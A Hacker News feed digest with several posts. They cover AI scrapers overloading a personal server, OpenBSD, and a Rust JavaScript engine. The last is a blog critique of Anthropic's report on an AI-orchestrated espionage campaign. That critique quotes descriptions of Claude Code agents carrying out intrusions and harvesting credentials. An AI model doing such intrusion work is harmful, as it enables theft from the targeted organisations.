<p>So I added a way of maintaining a reference count for all the nodes in the doc. When we produce a new document, we decrement the reference count of the old root node (it will always be 0 afterwards). So we recursively decrement the ref count of its children, and so on. This gives me exactly what I wanted ‚Äî a way to find all the nodes that were <em>not</em> reused, without having to visit most of the nodes in the doc.</p>

		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Internet Is No Longer a Safe Haven (219 pts)]]></title>
            <link>https://brainbaking.com/post/2025/10/the-internet-is-no-longer-a-safe-haven/</link>
            <guid>45944870</guid>
            <pubDate>Sun, 16 Nov 2025 13:12:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://brainbaking.com/post/2025/10/the-internet-is-no-longer-a-safe-haven/">https://brainbaking.com/post/2025/10/the-internet-is-no-longer-a-safe-haven/</a>, See on <a href="https://news.ycombinator.com/item?id=45944870">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
			    <div>
			  		<p>A couple of days ago, the small server hosting this website was temporarily knocked out by scraping bots. This wasn‚Äôt the first time, nor is it the first time I‚Äôm seriously considering employing more aggressive countermeasures such as Anubis (see for example the <a href="https://brainbaking.com/post/2025/07;june-2025">June 2025</a> summary post). But every time something like this happens, a portion of the software hobbyist in me dies. We should add this to the list of things AI scrapers destroy next to our environment, the creative enthusiasm of the individuals who made things that are being scraped, and our critical thinking skills.</p>
<p>When I tried accessing Brain Baking, I was met with an unusual delay that prompted me to login and see what‚Äôs going on. A simple <code>top</code> revealed both Gitea and the Fail2ban server gobbling up almost all CPU resources. Uh oh. Quickly killing Gitea didn‚Äôt reduce the work of Fail2ban as the Nginx access logs were being flooded with entries such as:</p>
<pre tabindex="0"><code>47.79.216.157 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/links.md?display=source HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.151 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/rss/commit/5911666cf0b30236cdc7590abb4e171534faf972/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.32 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/7b46fd682f36af81d4852b8ee2ee9970c638cac6/layouts HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.157 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/404.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.205 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/content/about.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.95 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/25674d6de08a667926aab89362fa7bb585cd35c5/content/links.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.191 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/themes HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.116 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/b4eac0fb71b056cb44fe062b8f2c0949dbb08af6/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
</code></pre><p>I have enough fail safe systems in place to block bad bots but the user agent <code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</code> isn‚Äôt immediately recognized as ‚Äúbad‚Äù: it‚Äôs ridiculously easy to spoof that HTTP header. Most user agent checkers I throw this string at claim this agent isn‚Äôt a bot. That means we shouldn‚Äôt only rely on this information.</p>
<p>Also, I temporarily block isolated IPs that keep on poking around (e.g. rate limiting on Nginx that get pulled into the ban list) but of course these scrapers never come from a single source. Yet the base attacking IP ranges remained the same: <code>47.79</code>. The website <a href="https://ipinfo.io/ips/47.79.1.0/24">ipinfo.io</a> can help in identifying the threat: <em>AS45102 Alibaba (US) Technology Co., Ltd.</em>. Huh?</p>
<p>Apparently, Alibaba provides hosting from Singapore that is frequently being abused by attackers. Many others that host forums software such as PhpBB <a href="https://www.phpbb.com/community/viewtopic.php?t=2662519">experienced the same problems</a> and although the AbuseIPDB <a href="https://www.abuseipdb.com/check/47.79.216.116">doesn‚Äôt report recent issues</a> on the IPs from the above logs, I went ahead and blocked the entire range.</p>
<p>Fail2ban was struggling to keep up: it ingests the Nginx access.log file to apply its rules but if the files keep on exploding‚Ä¶ Piping <code>cat access.log | grep /commit/ | cut -d " " -f 1</code> to instant-ban everyone trying to access Git‚Äôs commit logs simply wasn‚Äôt fast enough. The only thing that had immediate effect was <code>sudo iptables -I INPUT -s 47.79.0.0/16 -j DROP</code>.</p>
<p>In case that wasn‚Äôt yet clear: I hate having to deal with this. It‚Äôs a waste of time, doesn‚Äôt hold back the next attack coming from another range, and intervening always happens too late. But worst of all, semi-random fire fighting is just one big mood killer. I just <em>know</em> this won‚Äôt be enough. Having a robust anti attacker system in place might increase the odds but that means either resorting to hand cannons like Anubis or moving the entire hosting to CloudFlare that will do it for me. But I don‚Äôt want to fiddle with even more moving components and configuration, nor do I want to route my visitors through tracking-enabled USA servers.</p>
<p>That Gitea instance should be moved off-site, or better yet, I should move the migration to Codeberg to the top of my TODO list. Yet it‚Äôs sad to see that people who like fiddling with their own little servers are increasingly punished for doing so, pushing many to a centralized solution, making things worse in the long term. The internet is no longer a safe haven for software hobbyists. I could link to dozens of other bloggers who reported similar issues to further solidify my point.</p>
<p>Other things I‚Äôve noticed is increased traffic with Referer headers coming from strange websites such as <code>bioware.com</code>, <code>mcdonalds.com</code>, and <code>microsoft.com</code>. It‚Äôs not like any of these giants are going to link to an article on this site. I don‚Äôt understand what the purpose of spoofing that header is besides upping the hits count?</p>
<p>However worse things might get, I refuse to give in.</p>
<p>It‚Äôs just like 50 Cent said: <em>Get Hostin‚Äô Or Die Tryin‚Äô</em>.</p>


		  			<p>
			        
			        	
                
                    <kbd><a href="https://brainbaking.com/categories/webdesign">webdesign</a></kbd>
                
                &nbsp;
			        
				    
				    	
					    <span>
					        
					            <kbd><a href="https://brainbaking.com/tags/scraping" title="Tag: scraping">scraping</a></kbd>&nbsp;
					        
					            <kbd><a href="https://brainbaking.com/tags/ai" title="Tag: AI">AI</a></kbd>&nbsp;
					        
					    </span>
					</p>
				    
			  	</div>
			</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why use OpenBSD? (127 pts)]]></title>
            <link>https://www.tumfatig.net/2025/why-are-you-still-using-openbsd/</link>
            <guid>45944595</guid>
            <pubDate>Sun, 16 Nov 2025 12:25:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tumfatig.net/2025/why-are-you-still-using-openbsd/">https://www.tumfatig.net/2025/why-are-you-still-using-openbsd/</a>, See on <a href="https://news.ycombinator.com/item?id=45944595">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><h4><i></i>&nbsp;
<time datetime="2025-07-26">2025-07-26
</time>&nbsp;&nbsp;
<i></i>&nbsp;
784 words, 4 minutes</h4><nav id="TableOfContents"><ol><li><a href="#what-is-openbsd-">What is OpenBSD ?</a></li><li><a href="#why-using-openbsd-because-you-can">Why using OpenBSD? <em>Because you can!</em></a></li><li><a href="#why-using-openbsd-because-it-is-featurefull">Why using OpenBSD? <em>Because it is featurefull!</em></a></li><li><a href="#why-using-openbsd-because-it-provides-binary-packages">Why using OpenBSD? <em>Because it provides binary packages!</em></a></li><li><a href="#why-using-openbsd-because-it-is-simple">Why using OpenBSD? <em>Because it is simple!</em></a></li><li><a href="#why-using-openbsd-because">Why using OpenBSD? <em>Because ‚Ä¶</em></a></li><li><a href="#pointers-to-continue-the-journey">Pointers to continue the journey</a></li><li><a href="#one-more-thing">One more thing</a></li></ol></nav><p>Last week-end, I was invited to the <a href="https://usc.silentio.us/camp/usc2025-se6/" target="_blank" rel="external nofollow">UNIX Social
Camp</a>
in <a href="https://www.openstreetmap.org/?mlat=47.32&amp;mlon=5.05#map=5/47.32/5.05" target="_blank" rel="external nofollow">Dijon,
France</a>
to talk about the reasons I still use OpenBSD these days and why should
others do so; or at least, have a look at
<a href="https://www.openbsd.org/" target="_blank" rel="external nofollow">OpenBSD</a>
.</p><p>This post is an English transcription of the original <a href="https://www.tumfatig.net/files/2025/USC202507-Pourquoi-Utiliser-OpenBSD.pdf" target="_blank" rel="external nofollow">French slides
that are available here</a>
.</p><hr><h2 id="what-is-openbsd-">What is OpenBSD ?</h2><p>OpenBSD is a free UNIX<sup>¬©</sup>-like operating system.<br>It has been forked from NetBSD in 1995.</p><p>The development process concentrates on portability and security.<br>There are about 10+ supported hardware architecture.</p><p>Some of the software (OpenSSH, LibreSSL, pf‚Ä¶) developed for OpenBSD
are widely used in other free and proprietary software.</p><p>The official OpenBSD website is
<a href="https://www.openbsd.org/" target="_blank" rel="external nofollow">https://www.openbsd.org</a>
.</p><hr><h2 id="why-using-openbsd-because-you-can">Why using OpenBSD? <em>Because you can!</em></h2><p>The code is open and the sources freely available:
<a href="https://cvsweb.openbsd.org/src/" target="_blank" rel="external nofollow">OpenBSD CVSweb</a>
.</p><p>The installation media can be freely downloaded from
<a href="https://cdn.openbsd.org/pub/OpenBSD/" target="_blank" rel="external nofollow">OpenBSD CDN</a>
.</p><p>The system works on various hardware platforms:
<a href="https://www.openbsd.org/plat.html" target="_blank" rel="external nofollow">OpenBSD supported platform list</a>
.</p><p>The system is compatible with most virtualisation platforms:
Qemu, KVM, Virtualbox, VMware, bhyve, vmd‚Ä¶</p><hr><h2 id="why-using-openbsd-because-it-is-featurefull">Why using OpenBSD? <em>Because it is featurefull!</em></h2><p>It is developed and maintained with <a href="https://www.openbsd.org/security.html" target="_blank" rel="external nofollow">security in mind</a>
.<br>It ships with loads of <a href="https://www.openbsd.org/innovations.html" target="_blank" rel="external nofollow">security innovations</a>
:
privilege separation and revocation, stack protector, randomization,<br><a href="https://man.openbsd.org/pledge.2" target="_blank" rel="external nofollow">pledge(2)</a>
, <a href="https://man.openbsd.org/unveil.2" target="_blank" rel="external nofollow">unveil(2)</a>
,
etc‚Ä¶</p><p>Here are a few server-based options:</p><ul><li>Build a firewall with <a href="https://man.openbsd.org/man4/pf.4" target="_blank" rel="external nofollow">pf(4)</a>
.</li><li>Build a router with <a href="https://man.openbsd.org/man8/bgpd.8" target="_blank" rel="external nofollow">bgpd(8)</a>
.</li><li>Build a bastion with <a href="https://man.openbsd.org/sshd.8" target="_blank" rel="external nofollow">sshd(8)</a>
.</li><li>Build a DHCP and/or DNS server with
<a href="https://man.openbsd.org/dhcpd.8" target="_blank" rel="external nofollow">dhcpd(8)</a>
,
<a href="https://man.openbsd.org/nsd.8" target="_blank" rel="external nofollow">nsd(8)</a>
,
<a href="https://man.openbsd.org/unbound.8" target="_blank" rel="external nofollow">unbound(8)</a>
.</li><li>Build a user directory with <a href="https://man.openbsd.org/ldapd.8" target="_blank" rel="external nofollow">ldapd(8)</a>
.</li><li>Build a Web server with <a href="https://man.openbsd.org/httpd.8" target="_blank" rel="external nofollow">httpd(8)</a>
.<br>Build a reverse-proxy with <a href="https://man.openbsd.org/relayd.8" target="_blank" rel="external nofollow">relayd(8)</a>
.</li><li>Build a mail server with <a href="https://man.openbsd.org/smtpd.8" target="_blank" rel="external nofollow">smtpd(8)</a>
and/or <a href="https://man.openbsd.org/spamd.8" target="_blank" rel="external nofollow">spamd(8)</a>
.</li><li>Obtain and update TLS certificates from Let‚Äôs Encrypt using
<a href="https://man.openbsd.org/acme-client.1" target="_blank" rel="external nofollow">acme-client(1)</a>
.</li></ul><p>It can also be used as a workstation thanks to integrated software like:</p><ul><li>The <a href="https://man.openbsd.org/man1/xenodm.1" target="_blank" rel="external nofollow">xenodm(1)</a>
connection
manager.</li><li>The <a href="https://man.openbsd.org/man1/Xorg.1" target="_blank" rel="external nofollow">Xorg(1)</a>
graphical server.</li><li>One of those window managers:
<a href="https://man.openbsd.org/man1/fvwm.1" target="_blank" rel="external nofollow">fvwm(1)</a>
,
<a href="https://man.openbsd.org/man1/cwm.1" target="_blank" rel="external nofollow">cwm(1)</a>
,
<a href="https://man.openbsd.org/twm.1" target="_blank" rel="external nofollow">twm(1)</a>
.</li><li>The <a href="https://man.openbsd.org/xterm.1" target="_blank" rel="external nofollow">xterm(1)</a>
terminal emulator.</li><li>The <a href="https://man.openbsd.org/tmux.1" target="_blank" rel="external nofollow">tmux(1)</a>
terminal multiplexer.</li><li>One of the classical UNIX editors and shells:
<a href="https://man.openbsd.org/ed.1" target="_blank" rel="external nofollow">ed(1)</a>
,
<a href="https://man.openbsd.org/vi.1" target="_blank" rel="external nofollow">vi(1)</a>
,
<a href="https://man.openbsd.org/mg.1" target="_blank" rel="external nofollow">mg(1)</a>
,
<a href="https://man.openbsd.org/ksh.1" target="_blank" rel="external nofollow">ksh(1)</a>
,
<a href="https://man.openbsd.org/csh.1" target="_blank" rel="external nofollow">csh(1)</a>
.</li></ul><p>And many more‚Ä¶</p><hr><h2 id="why-using-openbsd-because-it-provides-binary-packages">Why using OpenBSD? <em>Because it provides binary packages!</em></h2><p>A whole set of Free and OpenSource Software is available as binary
packages for every supported architecture.</p><ul><li>amd64: ~12000</li><li>arm64: ~12000</li><li>powerpc: ~8000</li><li>risc64: ~10000</li><li>sparc64: ~9000</li><li>etc ‚Ä¶</li></ul><p>Server-oriented highlighted software for OpenBSD 7.7 include Apache,
Asterisk, Go, OpenJDK, MariaDB, Node.js, OpenLDAP, PHP, Postfix,
PostgreSQL, Ruby, Rust, ‚Ä¶</p><p>Workstation-oriented highlighted software for OpenBSD 7.7 include
Chromium, ffmpeg, Gnome, KDE, Krita, LibreOffice, Mozilla Firefox,
Mozilla Thunderbird, (Neo)Mutt, Python, Shotcut, TeX, (neo)vim, Xfce,
‚Ä¶</p><hr><h2 id="why-using-openbsd-because-it-is-simple">Why using OpenBSD? <em>Because it is simple!</em></h2><p>The text-mode installation wizard works the same way on the various
architecture and connection type (<code>COM0</code>, <code>VGA</code>, <code>HDMI</code>, <code>KVM-IP</code>‚Ä¶).</p><p>The documentation <a href="https://man.openbsd.org/man" target="_blank" rel="external nofollow"><code>man(1)</code></a>
is complete
and a welcome message pointing to
<a href="https://man.openbsd.org/afterboot" target="_blank" rel="external nofollow"><code>afterboot(8)</code></a>
helps you start with
using OpenBSD. The overall filesystem organisation is described in
<a href="https://man.openbsd.org/hier" target="_blank" rel="external nofollow"><code>hier(7)</code></a>
.</p><p>Service management configuration is locate in <code>/etc/rc.conf.local</code>.<br>Service management is available using a single
<a href="https://man.openbsd.org/rcctl" target="_blank" rel="external nofollow"><code>rcctl(8)</code></a>
command.</p><p>The OS material is installed throughout <code>/</code>.<br>Third-party material is installed under <code>/usr/local</code>.</p><p>The system configuration examples are located inside <code>/etc/examples/</code>.<br>All software configuration defaults to <code>/etc/</code>.</p><p>The dedicated <a href="https://man.openbsd.org/man8/fw_update.8" target="_blank" rel="external nofollow"><code>fw_update(8)</code></a>
command manages non-free firmwares.</p><p>Binary packages management includes dealing with dependencies and
<a href="https://man.openbsd.org/ports#FLAVORS" target="_blank" rel="external nofollow">options</a>
.<br>Three main commands deal with package management:
<a href="https://man.openbsd.org/man1/pkg_info.1" target="_blank" rel="external nofollow"><code>pkg_info(1)</code></a>
,
<a href="https://man.openbsd.org/pkg_add.1" target="_blank" rel="external nofollow"><code>pkg_add(1)</code></a>
,
<a href="https://man.openbsd.org/pkg_delete.1" target="_blank" rel="external nofollow"><code>pkg_delete(1)</code></a>
.</p><p>Security patches are managed using the
<a href="https://man.openbsd.org/syspatch.8" target="_blank" rel="external nofollow"><code>syspatch(8)</code></a>
command.<br>System upgrades are driven by the
<a href="https://man.openbsd.org/sysupgrade.8" target="_blank" rel="external nofollow"><code>sysupgrade(8)</code></a>
commands.</p><hr><h2 id="why-using-openbsd-because">Why using OpenBSD? <em>Because ‚Ä¶</em></h2><p><span>Strength lies in differences, not in similarities.</span></p><p><span>‚Äì Stephen Covey</span></p><hr><h2 id="pointers-to-continue-the-journey">Pointers to continue the journey</h2><p>RTFM! As in ‚Äúdo your homework before asking‚Äù.</p><ul><li>The OpenBSD <a href="https://www.openbsd.org/faq/index.html" target="_blank" rel="external nofollow">Frequently Asked Questions</a>
and <a href="https://man.openbsd.org/" target="_blank" rel="external nofollow">Manual Pages</a>
are filled with updated
information and examples.</li><li>The <a href="https://marc.info/?l=openbsd-misc" target="_blank" rel="external nofollow">@misc</a>
Mailing list ARChives
may already contain answer elements to your problems or questions.</li></ul><p>Self-advertising, if you liked this content:</p><ul><li>All OpenBSD content from this blog is available <a href="https://www.tumfatig.net/tags/openbsd/">here</a>
.</li><li>This Peertube video will give you an example of <a href="https://eggflix.foolbazar.eu/w/23tFBUygWvTDxdCKGrUDrP" target="_blank" rel="external nofollow">steps to set up an OpenBSD Workstation
People</a>
.</li><li>This Peertube video will drive you though <a href="https://eggflix.foolbazar.eu/w/vtvd3UQvF6tfmGQZviJ7ij" target="_blank" rel="external nofollow">purchasing and managing a VPS at OpenBSD
Amsterdam</a>
.</li></ul><p>Here are a couple of bookmarks I gathered:</p><ul><li>The <a href="https://openbsd.amsterdam/" target="_blank" rel="external nofollow">OpenBSD Amsterdam</a>
VPS provider.</li><li>The <a href="https://toobnix.org/c/bsdtv/video-playlists" target="_blank" rel="external nofollow">@BSDTV</a>
Peertube
channel.</li><li><a href="https://jcs.org/openbsd-laptops" target="_blank" rel="external nofollow">Joshua Stein‚Äôs OpenBSD laptops</a>
.</li><li>The <a href="https://undeadly.org/cgi?action=front" target="_blank" rel="external nofollow">OpenBSD Journal</a>
.</li><li>The <a href="https://webzine.puffy.cafe/" target="_blank" rel="external nofollow">OpenBSD Webzine</a>
.</li><li><a href="https://home.nuug.no/~peter/pftutorial/#1" target="_blank" rel="external nofollow">Peter Hansteen‚Äôs pf tutorial</a>
.</li><li><a href="https://romanzolotarev.com/openbsd/" target="_blank" rel="external nofollow">Roman Zolotarev‚Äôs blog</a>
.</li><li><a href="https://dataswamp.org/~solene/index.html" target="_blank" rel="external nofollow">Solene‚Äôs blog</a>
.</li></ul><p>Note that those content may not have been updated recently. That said,
the content is probably still pretty accurate.</p><hr><h2 id="one-more-thing">One more thing</h2><p>Thanks again to the UCS for inviting me.</p><p>And if you wonder how the slideware was produced, I used the
<a href="https://github.com/gnab/remark" target="_blank" rel="external nofollow">remark</a>
slideshow generator, the
<a href="https://www.brailleinstitute.org/freefont/" target="_blank" rel="external nofollow">Atkinson Hyperlegible Next
Medium</a>
and the <a href="https://tosche.net/fonts/comic-code" target="_blank" rel="external nofollow">Comic Code
Ligatures Medium</a>
fonts. Because
not everything is Google Docs and Arial! üòà</p></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Brimstone: ES2025 JavaScript engine written in Rust (180 pts)]]></title>
            <link>https://github.com/Hans-Halverson/brimstone</link>
            <guid>45944337</guid>
            <pubDate>Sun, 16 Nov 2025 11:41:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Hans-Halverson/brimstone">https://github.com/Hans-Halverson/brimstone</a>, See on <a href="https://news.ycombinator.com/item?id=45944337">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Brimstone</h2><a id="user-content-brimstone" aria-label="Permalink: Brimstone" href="#brimstone"></a></p>
<p dir="auto">Brimstone is a JavaScript engine written from scratch in Rust, aiming to have full support for the JavaScript language.</p>
<p dir="auto">Brimstone is a work in progress but already supports almost all of the JavaScript language (&gt;97% of the ECMAScript language in test262). Not ready for use in production.</p>
<p dir="auto">Implements the <a href="https://tc39.es/ecma262/" rel="nofollow">ECMAScript specification</a>. Heavy inspiration is taken from the design of <a href="https://v8.dev/" rel="nofollow">V8</a> and SerenityOS's <a href="https://github.com/LadybirdBrowser/ladybird">LibJS</a>. Brimstone chooses to implement almost all components of the engine from scratch with minimal dependencies, with the notable exception of <a href="https://github.com/unicode-org/icu4x">ICU4X</a>.</p>
<p dir="auto">Brimstone features:</p>
<ul dir="auto">
<li>Bytecode VM, heavily inspired by the design of V8's Ignition</li>
<li>Compacting garbage collector, written in <em>very</em> unsafe Rust</li>
<li>Custom RegExp engine</li>
<li>Custom parser</li>
<li>Almost all builtin objects and functions implemented to spec</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Building and testing</h2><a id="user-content-building-and-testing" aria-label="Permalink: Building and testing" href="#building-and-testing"></a></p>
<p dir="auto">Standard <code>cargo</code> commands to build and run.</p>
<ul dir="auto">
<li><code>cargo build</code> to build the <code>bs</code> executable</li>
<li><code>cargo run</code> to run from source</li>
</ul>
<p dir="auto">JavaScript files can be executed with <code>bs</code>:</p>
<div data-snippet-clipboard-copy-content="# Build brimstone
cargo build

# Execute a JavaScript file
./target/debug/bs ./hello.js
Hello world!"><pre><code># Build brimstone
cargo build

# Execute a JavaScript file
./target/debug/bs ./hello.js
Hello world!
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Testing</h2><a id="user-content-testing" aria-label="Permalink: Testing" href="#testing"></a></p>
<p dir="auto">Brimstone relies heavily on a set of first and third party integration test suites, most notably the official <a href="https://github.com/tc39/test262">test262</a> test suite. A custom <a href="https://github.com/Hans-Halverson/brimstone/blob/master/tests/README.md">integration test runner</a> is included. This can be run with:</p>

<p dir="auto">Unit and snapshot tests can be run with <code>cargo test</code>.</p>
<p dir="auto">For more information on testing see the <a href="https://github.com/Hans-Halverson/brimstone/blob/master/tests/README.md">testing README</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Missing features</h2><a id="user-content-missing-features" aria-label="Permalink: Missing features" href="#missing-features"></a></p>
<p dir="auto">All features up to ES2024 have been implemented, as well as all stage 4 proposals as of the Feb. 2025 TC39 meeting, except for the following features:</p>
<ul dir="auto">
<li>SharedArrayBuffer</li>
<li>Atomics</li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Anthropic's report smells a lot like bullshit (796 pts)]]></title>
            <link>https://djnn.sh/posts/anthropic-s-paper-smells-like-bullshit/</link>
            <guid>45944296</guid>
            <pubDate>Sun, 16 Nov 2025 11:32:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://djnn.sh/posts/anthropic-s-paper-smells-like-bullshit/">https://djnn.sh/posts/anthropic-s-paper-smells-like-bullshit/</a>, See on <a href="https://news.ycombinator.com/item?id=45944296">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page">
            

            <section>
    <header>
        
    </header>
    
    <div>
        <p>A <a href="https://assets.anthropic.com/m/ec212e6566a0d47/original/Disrupting-the-first-reported-AI-orchestrated-cyber-espionage-campaign.pdf">report</a> was recently published by an AI-research company called <a href="https://www.anthropic.com/">Anthropic</a>.
They are the ones who notably created <a href="https://www.anthropic.com/">Claude</a>, an AI-assistant for coding. Personally, I don‚Äôt use it but that is besides the point.
Before we start, it‚Äôs important to say I don‚Äôt have anything against them, or AI in general. I do have <a href="https://djnn.sh/posts/on-llms/">some documented concerns</a> but I am not ‚ÄúAnti-AI‚Äù, or whatever.
Rather than the technology itself, it‚Äôs the industry‚Äôs perception of it, and the way it is inserted everywhere, even when unnecessary that bothers me. However, that too is a bit besides the point.</p>
<p>Today, I wanted to discuss the Paper (or Report, however you want to call it) that was recently published by them.
Looking at the executive summary, this paragraph jumps out immediately.</p>
<blockquote>
<p>In mid-September 2025, we detected a highly sophisticated cyber espionage operation
conducted by a Chinese state-sponsored group we‚Äôve designated GTG-1002 that
represents a fundamental shift in how advanced threat actors use AI. Our investigation
revealed a well-resourced, professionally coordinated operation involving multiple
simultaneous targeted intrusions. The operation targeted roughly 30 entities and our
investigation validated a handful of successful intrusions.</p>
</blockquote>
<p>This is extremely interesting for many reasons:</p>
<ul>
<li>Anthropic seemingly disrupted an <a href="https://en.wikipedia.org/wiki/Advanced_persistent_threat">APT</a>‚Äôs campaign, though a number of companies and government entities were affected,</li>
<li>This highly-advanced APT doesn‚Äôt use its own infra, but rather relies on Claude to coordinate its automation (??? Why, though ?),</li>
<li>I assume they run exploits and custom tools ? If so, what are these ?</li>
<li>Anthropic was able to attribute this attack to a Chinese-affiliated state-sponsored group.</li>
</ul>
<p>If you‚Äôre like me, you then eagerly read the rest of the paper, hoping to find clues and technical details on the TTPs (Tactics, Techniques and Procedures), or IoCs (Indicators of Compromise) to advance the research.
However, the report very quickly falls flat, which sucks.</p>
<h2 id="where-are-the-iocs-mrclaude-">where are the IoCs, Mr.Claude ?</h2>
<p>The primary goal of a Threat-Intelligence report such as this one would be to inform other parties of a new type of attack, and artefacts they might use to discover the attack on their network.
This is typically done by sharing domain-names linked with the campaign, MD5 or SHA512 hashes you could look for on Virus Exchange websites such as <a href="https://www.virustotal.com/gui/">VirusTotal</a>, or other markers that would help you verify that your
networks are safe. As an example, <a href="https://cert.ssi.gouv.fr/uploads/CERTFR-2023-CTI-009.pdf">here</a> is the French CERT sharing (in French, but an English version is available too) about APT28‚Äôs TTPs.</p>
<p>We can see:</p>
<ul>
<li><a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> used to determine what are the techniques used (eg: Account Manipulation, Antivirus evasion, etc.),</li>
<li>Emails used for phishing, originating IPs and even date when these emails are sent,</li>
<li>Tooling (VPN software, but also what kind of tools) used by the APT,</li>
<li>a set of recommandations</li>
</ul>
<p>This report is just one I picked randomly by skimming through their publications. Any serious CERT or Threat-Intel company would publish things in the same fashion, because this is the industry standard.
These publications are made public to inform Security Operation Centers around the world about how to detect and prevent those attacks.</p>
<h2 id="poc--gtfo">PoC || GTFO</h2>
<p>In this case, none of the these markers are present in the report. In fact, not a whole lot of the information is verifiable, which is another problem.</p>
<blockquote>
<p>The human operator tasked instances of Claude Code to operate in groups as autonomous penetration testing orchestrators and agents, with the threat actor able to leverage AI to execute 80-90% of tactical operations independently at physically impossible request rates</p>
</blockquote>
<p>This figure (80-90%) is not verifiable either. How do we know this is actually the case ?
I have no doubt so-called Autonomous agents are being used in these campaigns, in some capacity. However this report clearly states that Autonomous Agents perform active exploitation, and even data exfiltration.</p>
<p>What kind of tooling is used ? What kind of information has been extracted ? Who is at risk ? How does a CERT identifies an AI agent in their networks ?
None of these questions are answered. It‚Äôs not like Anthropic doesn‚Äôt have access to this data, since they claim they were able to stop it.</p>
<blockquote>
<p>Upon receiving authorization from the human operators, Claude executed systematic
credential collection across targeted networks. This involved querying internal services,
extracting authentication certificates from configurations, and testing harvested
credentials across discovered systems.</p>
</blockquote>
<p>How ? Did it run Mimikatz ? Did it access Cloud environments ? We don‚Äôt even know what kind of systems were affected.
There is no details, or fact-based evidence to support these claims or even help other people protect their networks.</p>
<p>The report goes on to claim that upon detection, the accounts were closed and implemented ‚Äúenhancements‚Äù, and then drops this gem:</p>
<blockquote>
<p>We notified relevant authorities and industry partners, and shared information with impacted entities where appropriate.</p>
</blockquote>
<p>What is that even supposed to mean ? You claim your agents were able to find exploitable vulnerabilities in multiple services.
Were these patched ? What about the extracted data ? What about the affected people ? Do you care about this at all ?</p>
<h2 id="final-thoughts">final thoughts</h2>
<p>Look, is it very likely that Threat Actors are using these Agents with bad intentions, no one is disputing that. But this report does not meet the standard of publishing for serious companies.
The same goes with research in other fields. You <strong>cannot</strong> just claim things and not back it up in any way, and we <strong>cannot</strong> as an industry accept that it‚Äôs OK for companies to release this.</p>
<p>There seem to be a pattern for Tech Companies (especially in AI, but they‚Äôre not the only culprits) out there to just announce things, generate hype and then under-deliever.
Just because it works with VCs doesn‚Äôt mean it should work with us. We should, as an industry, expect better.</p>
<p>For instance, it attributes the attacks to a Chinese State-affiliated (!!!) group, but does not go on to give any details.
Which APT is it ? What helped you determine this ?</p>
<p>Attribution is a <strong>very</strong> serious matter, with sometimes diplomatical implications. You can‚Äôt just go on and point the finger at anyone and expect people to believe you for no reason.
In a time of increasing tensions between the West and China, it does not seem like the smart thing to do at all. Frankly, I don‚Äôt understand who was stupid enough to approve this to be released.
For all we know, the ‚Äúadvanced threat actors‚Äù they‚Äôre talking about here could just be script kiddies trying to automate <code>ffuf</code> and <code>sqlmap</code> commands.</p>
<p>If they‚Äôre going to release IoCs and proof of everything, I‚Äôd be happy to share them here. But until them, I will say this: this paper would not pass any review board.
